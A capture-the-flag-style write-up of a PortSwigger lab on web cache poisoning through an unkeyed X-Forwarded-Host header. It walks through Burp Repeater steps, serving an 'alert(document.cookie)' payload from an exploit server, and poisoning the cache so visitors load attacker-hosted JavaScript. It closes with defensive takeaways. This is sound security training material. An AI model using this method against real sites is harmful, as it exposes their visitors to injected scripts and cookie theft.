#  Web Cache Poisoning with an Unkeyed Header

## 📌 Lab Details
- **Title**: Web Cache Poisoning with an Unkeyed Header
- **Difficulty**: Practitioner
- **Category**: Web Cache Poisoning
- **Lab URL**: https://portswigger.net/academy/labs/launch/145baf066fe7fe27bb26a1a295e6a58d17ac101777181cc01014c893fdda06c6?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-with-an-unkeyed-header

## 🔍 Summary
This lab demonstrates a **Web Cache Poisoning** vulnerability caused by the application's unsafe use of the `X-Forwarded-Host` header. <br>
The application dynamically generates the URL of a Javascript file using the value supplied in the `X-Forwarded-Host` header. Although this header influences the response content, it is **not included in the cache key**. <br>
As a result, an attacker can poison the cache with a response containing a malicious Javascript URL hosted on an attacker-controlled server. Subsequent visitors receive the cached response and automatically load the malicious script.

## 🛠 Steps to Solve
1. Find the `GET` request for the home page and send it to Burp Repeater.
2. Add a cache-buster query parameter, such as `?cb=1234`.
3. Add the `X-Forwarded-Host` header with an arbitrary hostname, such as `example.com`, and send the request.
4. Observe that the `X-Forwarded-Host` header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at `/resources/js/tracking.js`.
5. Replay the request and observe that the response contains the header `X-Cache: hit`. This tells us that the response came from the cache.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response: `/resources/js/tracking.js`.
7. In the body, enter the payload `alert(document.cookie)` and store the exploit.
8. Open the `GET` request for the home page in Burp Repeater and remove the cache buster. Add the following header, remembering to enter your own exploit server ID:
   ```sh
   X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   ```
9. Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and `X-Cache: hit` in the headers.
10. To simulate the victim, load the poisoned URL in the browser and make sure that the `alert()` is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
11. 

## 📖 Key Takeaways
- Web cache poisoning occurs when user input affects cached responses.
- Any input that changes response content must be included in the cache key.
- Cache poisoning can transform a reflected issue into a stored attack affecting multiple users.
- Always investigate reflected headers when assessing cache behavior.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0e10ba0c-4197-469f-abba-59568c56a8bf" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5f294f97-2fb1-4dad-970a-f68706d4fefc" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a4596f77-ddbf-42da-baa0-3dc06ad4e66e" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3d8ea9b4-325d-430d-8a06-2422a89124ba" />
